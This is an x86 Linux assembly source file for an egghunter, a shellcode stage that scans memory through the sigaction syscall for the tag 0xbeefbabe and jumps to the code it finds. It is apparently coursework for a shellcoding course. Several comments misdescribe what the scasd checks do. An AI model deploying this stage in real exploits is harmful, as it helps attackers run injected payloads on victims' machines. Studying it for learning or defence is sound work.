; Skape paper: https://github.com/jayeshchm/SLAE-Assignments/tree/master/SLAE%20Assignment%203  
; 

global _start

section .text


	_start:
		
		xor ecx , ecx

	startAgain:
			
			or cx , 0xfff		; Page alignemnt 
	nextAddr:

			inc ecx			; ecx=4096 => PAGE_SIZE(32-bit machine)
			push byte +0x43		; sigaction syscall no
			pop eax			; eax=67
			int 0x80		; informs kernel for execution

			cmp al , 0xf2		; return value(lower 1 byte) is compared with 0xf2
			jz startAgain		; if (al == 0xf2) => true ; EFAULT error occurred
						; i.e. invalid memory address returned then
						; start page alignment by bitwise OR on cx(low 16-bit)

			mov eax , 0xbeefbabe	; else load TAG address in eax &  
			mov edi , ecx		; edi = ecx
			scasd			; if (edi != ecx) => true   
						  
			jnz nextAddr		; then increment PAGE_SIZE by 1 byte &
						; test again for valid address i.e. 0xbeefbabe
			
			scasd			; else if (edi != eax) => true  
			jnz nextAddr		; then increment PAGE_SIZE byte &
						; test again for valid address 0xbeefbabe
			
			jmp edi			; else edi=eax => Found address....!!!
						; call shellcode
